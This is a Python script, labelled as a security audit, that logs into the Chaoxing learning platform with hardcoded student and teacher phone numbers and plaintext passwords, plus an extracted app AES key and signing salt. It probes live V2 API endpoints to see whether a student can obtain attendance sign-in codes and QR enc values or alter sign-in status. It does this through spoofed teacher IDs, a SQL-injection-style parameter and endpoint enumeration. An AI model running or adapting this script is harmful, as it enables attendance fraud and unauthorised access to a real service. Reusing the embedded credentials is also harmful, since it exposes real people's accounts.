#!/usr/bin/env python3
"""
V2 API 信息泄露安全审计脚本
测试超星学习通V2接口是否存在签到码、enc值、二维码内容等敏感信息泄露
"""

import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

STUDENT_PUID = "431407443"
TEACHER_PUID = "402644510"

# ============ 登录函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ 辅助函数 ============
def safe_get(session, url, desc="", params=None, timeout=20):
    """安全GET请求，捕获异常"""
    try:
        r = session.get(url, params=params, timeout=timeout, allow_redirects=False)
        try:
            data = r.json()
        except:
            data = r.text[:2000]
        return {"status": r.status_code, "data": data, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def safe_post(session, url, desc="", data=None, timeout=20):
    """安全POST请求，捕获异常"""
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=False)
        try:
            resp = r.json()
        except:
            resp = r.text[:2000]
        return {"status": r.status_code, "data": resp, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def extract_sensitive_fields(data, fields=None):
    """从响应中提取敏感字段"""
    if fields is None:
        fields = ["signCode", "enc", "signType", "otherId", "isNeedFace", "isNeedValidate",
                  "signUrl", "qrUrl", "qrCode", "code", "status", "name", "uid",
                  "activeType", "startTime", "endTime", "releaseTime", "ifSignIn",
                  "attendNum", "unsignNum", "result", "errorMsg", "msg", "message",
                  "isSign", "signStatus", "studentStatus"]
    result = {}
    if isinstance(data, dict):
        for f in fields:
            if f in data:
                result[f] = data[f]
        # 递归检查嵌套dict
        for k, v in data.items():
            if isinstance(v, dict):
                nested = extract_sensitive_fields(v, fields)
                for nk, nv in nested.items():
                    key = f"{k}.{nk}"
                    if key not in result:
                        result[key] = nv
            elif isinstance(v, list):
                for i, item in enumerate(v[:3]):  # 只检查前3个
                    if isinstance(item, dict):
                        nested = extract_sensitive_fields(item, fields)
                        for nk, nv in nested.items():
                            key = f"{k}[{i}].{nk}"
                            if key not in result:
                                result[key] = nv
    return result

def print_section(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def print_result(result, label=""):
    """打印请求结果"""
    if label:
        print(f"\n--- {label} ---")
    print(f"  描述: {result['desc']}")
    print(f"  状态码: {result['status']}")
    if result['ok']:
        data = result['data']
        if isinstance(data, dict):
            # 先打印敏感字段
            sensitive = extract_sensitive_fields(data)
            if sensitive:
                print(f"  ★★★ 敏感字段 ★★★")
                for k, v in sensitive.items():
                    print(f"    {k} = {v}")
            # 打印完整响应（截断）
            dumped = json.dumps(data, ensure_ascii=False, indent=2)
            if len(dumped) > 3000:
                dumped = dumped[:3000] + "\n... (截断)"
            print(f"  完整响应:\n{dumped}")
        else:
            print(f"  响应: {data}")
    else:
        print(f"  错误: {result['data']}")

# ============ 主测试流程 ============
def main():
    print("=" * 80)
    print("  超星学习通 V2 API 信息泄露安全审计")
    print("=" * 80)

    # ---- 登录 ----
    print_section("1. 登录")
    print("正在登录学生账号...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {stu_puid}")

    print("正在登录教师账号...")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("❌ 登录失败，退出")
        return

    # ---- 测试1: getPPTActiveInfo ----
    print_section("2. getPPTActiveInfo - 签到活动详情")

    # 2a. 教师访问
    url = f"https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo"
    r = safe_get(tea_session, url, "教师-获取签到活动详情",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "教师访问 getPPTActiveInfo")

    # 2b. 学生访问（关键测试！）
    r = safe_get(stu_session, url, "学生-获取签到活动详情",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "学生访问 getPPTActiveInfo (关键：是否泄露signCode/enc)")

    # 2c. 学生访问 + uid参数
    r = safe_get(stu_session, url, "学生-带uid参数",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID})
    print_result(r, "学生访问 getPPTActiveInfo (带uid)")

    # 2d. 学生访问 + courseId/classId
    r = safe_get(stu_session, url, "学生-带courseId/classId",
                 params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "学生访问 getPPTActiveInfo (带courseId/classId)")

    # 2e. 学生尝试用教师uid
    r = safe_get(stu_session, url, "学生-伪造教师uid",
                 params={"activeId": ACTIVE_ID, "uid": TEACHER_PUID})
    print_result(r, "学生访问 getPPTActiveInfo (伪造教师uid)")

    # ---- 测试2: getActiveInfo ----
    print_section("3. getActiveInfo - 替代活动详情接口")

    url2 = "https://mobilelearn.chaoxing.com/v2/apis/active/getActiveInfo"
    r = safe_get(tea_session, url2, "教师-getActiveInfo",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "教师访问 getActiveInfo")

    r = safe_get(stu_session, url2, "学生-getActiveInfo",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "学生访问 getActiveInfo (关键：是否泄露signCode/enc)")

    # ---- 测试3: student/activelist ----
    print_section("4. student/activelist - 活动列表")

    url3 = "https://mobilelearn.chaoxing.com/v2/apis/active/student/activelist"
    r = safe_get(stu_session, url3, "学生-活动列表",
                 params={"courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "学生访问 activelist")

    r = safe_get(tea_session, url3, "教师-活动列表",
                 params={"courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "教师访问 activelist")

    # ---- 测试4: preSign (V2) ----
    print_section("5. preSign - V2版本")

    url4 = "https://mobilelearn.chaoxing.com/v2/apis/sign/preSign"
    r = safe_get(stu_session, url4, "学生-preSign",
                 params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "学生访问 preSign")

    r = safe_get(stu_session, url4, "学生-preSign(带uid)",
                 params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID})
    print_result(r, "学生访问 preSign (带uid)")

    # ---- 测试5: signIn (V2) ----
    print_section("6. signIn - V2签到接口")

    url5 = "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn"
    # 先不带签到码测试
    r = safe_post(stu_session, url5, "学生-signIn(无参数)",
                  data={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                        "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "学生 signIn (无签到码)")

    # ---- 测试6: updateSignStatus ----
    print_section("7. updateSignStatus - 修改签到状态")

    url6 = "https://mobilelearn.chaoxing.com/v2/apis/sign/updateSignStatus"
    r = safe_post(stu_session, url6, "学生-尝试修改签到状态",
                  data={"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "status": "1"})
    print_result(r, "学生 updateSignStatus")

    r = safe_get(stu_session, url6, "学生-GET修改签到状态",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "status": "1"})
    print_result(r, "学生 updateSignStatus (GET)")

    # ---- 测试7: mooc1-api 域名对比 ----
    print_section("8. mooc1-api 域名对比测试")

    # getPPTActiveInfo on mooc1-api
    url7a = "https://mooc1-api.chaoxing.com/v2/apis/active/getPPTActiveInfo"
    r = safe_get(stu_session, url7a, "学生-mooc1-api getPPTActiveInfo",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "学生访问 mooc1-api getPPTActiveInfo")

    r = safe_get(tea_session, url7a, "教师-mooc1-api getPPTActiveInfo",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "教师访问 mooc1-api getPPTActiveInfo")

    # getActiveInfo on mooc1-api
    url7b = "https://mooc1-api.chaoxing.com/v2/apis/active/getActiveInfo"
    r = safe_get(stu_session, url7b, "学生-mooc1-api getActiveInfo",
                 params={"activeId": ACTIVE_ID})
    print_result(r, "学生访问 mooc1-api getActiveInfo")

    # activelist on mooc1-api
    url7c = "https://mooc1-api.chaoxing.com/v2/apis/active/student/activelist"
    r = safe_get(stu_session, url7c, "学生-mooc1-api activelist",
                 params={"courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "学生访问 mooc1-api activelist")

    # ---- 测试8: 尝试不同的activeId参数 ----
    print_section("9. 参数注入/越权测试")

    # 尝试不带activeId
    r = safe_get(stu_session, url, "学生-无activeId",
                 params={})
    print_result(r, "学生访问 getPPTActiveInfo (无activeId)")

    # 尝试SQL注入风格参数
    r = safe_get(stu_session, url, "学生-特殊activeId",
                 params={"activeId": "5000163891319' OR '1'='1"})
    print_result(r, "学生访问 getPPTActiveInfo (注入activeId)")

    # 尝试访问其他课程的活动
    r = safe_get(stu_session, url, "学生-不同courseId",
                 params={"activeId": ACTIVE_ID, "courseId": "999999999"})
    print_result(r, "学生访问 getPPTActiveInfo (不同courseId)")

    # ---- 测试9: 更多V2端点 ----
    print_section("10. 其他V2端点探测")

    extra_endpoints = [
        "/v2/apis/active/getActiveDetail",
        "/v2/apis/active/info",
        "/v2/apis/sign/getSignDetail",
        "/v2/apis/sign/signDetail",
        "/v2/apis/sign/getActiveSignInfo",
        "/v2/apis/active/getSignActiveInfo",
        "/v2/apis/sign/taskDetail",
        "/v2/apis/active/signInfo",
        "/v2/apis/sign/config",
        "/v2/apis/sign/qrcode",
        "/v2/apis/sign/getEnc",
        "/v2/apis/sign/getSignCode",
        "/v2/apis/active/getQRCode",
        "/v2/apis/active/enc",
    ]

    for ep in extra_endpoints:
        full_url = f"https://mobilelearn.chaoxing.com{ep}"
        r = safe_get(stu_session, full_url, f"学生-探测{ep}",
                     params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
        if r['ok'] and r['status'] == 200:
            data = r['data']
            if isinstance(data, dict) and data.get('result') != 0 and data.get('result') is not None:
                sensitive = extract_sensitive_fields(data)
                if sensitive:
                    print(f"\n  ★ 发现有效端点: {ep}")
                    print(f"    敏感字段: {sensitive}")
                    dumped = json.dumps(data, ensure_ascii=False, indent=2)[:1500]
                    print(f"    响应: {dumped}")

    # ---- 测试10: 深度分析getPPTActiveInfo响应差异 ----
    print_section("11. 教师vs学生响应差异深度分析")

    tea_r = safe_get(tea_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "教师", params={"activeId": ACTIVE_ID})
    stu_r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "学生", params={"activeId": ACTIVE_ID})

    if tea_r['ok'] and stu_r['ok']:
        tea_data = tea_r['data'] if isinstance(tea_r['data'], dict) else {}
        stu_data = stu_r['data'] if isinstance(stu_r['data'], dict) else {}

        print("\n教师响应所有字段:")
        if isinstance(tea_data, dict):
            for k, v in tea_data.items():
                print(f"  {k} = {v}")

        print("\n学生响应所有字段:")
        if isinstance(stu_data, dict):
            for k, v in stu_data.items():
                print(f"  {k} = {v}")

        # 比较差异
        if isinstance(tea_data, dict) and isinstance(stu_data, dict):
            tea_keys = set(tea_data.keys())
            stu_keys = set(stu_data.keys())

            only_teacher = tea_keys - stu_keys
            only_student = stu_keys - tea_keys
            common = tea_keys & stu_keys

            if only_teacher:
                print(f"\n★★★ 仅教师可见字段: {only_teacher}")
                for k in only_teacher:
                    print(f"  {k} = {tea_data[k]}")

            if only_student:
                print(f"\n仅学生可见字段: {only_student}")
                for k in only_student:
                    print(f"  {k} = {stu_data[k]}")

            print(f"\n共同字段值差异:")
            for k in common:
                tv = tea_data.get(k)
                sv = stu_data.get(k)
                if tv != sv:
                    print(f"  {k}: 教师={tv} | 学生={sv}")

            # 深入检查嵌套的data字段
            if 'data' in tea_data and isinstance(tea_data['data'], dict):
                print("\n--- 教师 data 嵌套字段 ---")
                for k, v in tea_data['data'].items():
                    print(f"  data.{k} = {v}")

            if 'data' in stu_data and isinstance(stu_data['data'], dict):
                print("\n--- 学生 data 嵌套字段 ---")
                for k, v in stu_data['data'].items():
                    print(f"  data.{k} = {v}")

    # ---- 测试11: mooc1-api getPPTActiveInfo 对比 ----
    print_section("12. mooc1-api getPPTActiveInfo 教师vs学生")

    tea_r2 = safe_get(tea_session, "https://mooc1-api.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                      "教师-mooc1", params={"activeId": ACTIVE_ID})
    stu_r2 = safe_get(stu_session, "https://mooc1-api.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                      "学生-mooc1", params={"activeId": ACTIVE_ID})

    if tea_r2['ok'] and stu_r2['ok']:
        tea_data2 = tea_r2['data'] if isinstance(tea_r2['data'], dict) else {}
        stu_data2 = stu_r2['data'] if isinstance(stu_r2['data'], dict) else {}

        print("\nmooc1-api 教师响应:")
        if isinstance(tea_data2, dict):
            for k, v in tea_data2.items():
                print(f"  {k} = {v}")

        print("\nmooc1-api 学生响应:")
        if isinstance(stu_data2, dict):
            for k, v in stu_data2.items():
                print(f"  {k} = {v}")

    # ---- 测试12: 尝试获取签到码相关接口 ----
    print_section("13. 签到码/enc专用接口探测")

    code_endpoints = [
        ("GET", "https://mobilelearn.chaoxing.com/v2/apis/sign/getSignCode", {"activeId": ACTIVE_ID}),
        ("GET", "https://mobilelearn.chaoxing.com/v2/apis/sign/getEnc", {"activeId": ACTIVE_ID}),
        ("GET", "https://mobilelearn.chaoxing.com/v2/apis/sign/qrcode", {"activeId": ACTIVE_ID}),
        ("GET", "https://mobilelearn.chaoxing.com/v2/apis/active/getQRCode", {"activeId": ACTIVE_ID}),
        ("POST", "https://mobilelearn.chaoxing.com/v2/apis/sign/getSignCode", {"activeId": ACTIVE_ID}),
        ("POST", "https://mobilelearn.chaoxing.com/v2/apis/sign/getEnc", {"activeId": ACTIVE_ID}),
        # 经典接口对比
        ("GET", "https://mobilelearn.chaoxing.com/active/getPPTActiveInfo", {"activeId": ACTIVE_ID}),
        ("GET", "https://mobilelearn.chaoxing.com/active/info", {"activeId": ACTIVE_ID}),
    ]

    for method, ep_url, params in code_endpoints:
        if method == "GET":
            r = safe_get(stu_session, ep_url, f"学生-{method} {ep_url}", params=params)
        else:
            r = safe_post(stu_session, ep_url, f"学生-{method} {ep_url}", data=params)
        print_result(r, f"{method} {ep_url.split('.com')[-1]}")

    # ---- 测试13: activelist 深度分析 ----
    print_section("14. activelist 深度分析 - 检查是否泄露其他学生信息")

    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/student/activelist",
                 "学生-activelist完整响应",
                 params={"courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data']
        dumped = json.dumps(data, ensure_ascii=False, indent=2)
        if len(dumped) > 5000:
            dumped = dumped[:5000] + "\n... (截断)"
        print(f"完整响应:\n{dumped}")

        # 检查是否有其他学生的签到信息
        if 'data' in data and isinstance(data['data'], list):
            print(f"\n活动列表数量: {len(data['data'])}")
            for i, act in enumerate(data['data'][:5]):
                print(f"\n活动[{i}]:")
                sensitive = extract_sensitive_fields(act)
                for k, v in sensitive.items():
                    print(f"  {k} = {v}")

    # ---- 测试14: 尝试教师端activelist ----
    print_section("15. 教师端activelist - 检查教师能看到什么")

    r = safe_get(tea_session, "https://mobilelearn.chaoxing.com/v2/apis/active/student/activelist",
                 "教师-activelist",
                 params={"courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data']
        dumped = json.dumps(data, ensure_ascii=False, indent=2)
        if len(dumped) > 5000:
            dumped = dumped[:5000] + "\n... (截断)"
        print(f"教师activelist完整响应:\n{dumped}")

    # ---- 总结 ----
    print_section("审计总结")
    print("""
关键发现将基于以上测试结果：
1. 学生是否能通过getPPTActiveInfo获取signCode（签到码）
2. 学生是否能通过getPPTActiveInfo获取enc（二维码加密值）
3. 学生是否能通过activelist看到其他学生的签到状态
4. updateSignStatus是否允许学生修改签到状态
5. mooc1-api与mobilelearn的权限控制差异
6. 是否存在未授权的V2端点泄露敏感信息
    """)


if __name__ == "__main__":
    main()
